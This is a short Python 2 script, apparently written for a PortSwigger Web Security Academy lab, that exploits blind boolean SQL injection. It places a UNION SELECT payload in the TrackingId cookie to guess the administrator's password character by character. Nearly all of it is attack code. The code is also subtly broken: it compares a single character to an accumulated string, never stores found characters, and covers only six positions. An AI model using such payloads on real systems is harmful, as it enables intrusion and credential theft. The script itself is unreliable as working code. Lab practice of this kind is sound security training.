# written for web sec academy sqli
import sys
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

url = sys.argv[1]
password = ""
wordlist = "/root/PortSwigger/scripts/letters.txt"

x = range(1,7)
for i in x:
    letters = open(wordlist, "r")
    for l in letters.readlines():
        letter = l.strip()
        cookies = {'TrackingId':'xyz\' UNION SELECT \'a\' FROM users WHERE Username = \'administrator\' and SUBSTRING(Password, %s, 1) = \'%s\'--'% (i,password+letter)}
        out = requests.get(url, cookies=cookies).text
        if "Welcome back!" in out:
            print "[+] Found char: %s" % password+letter
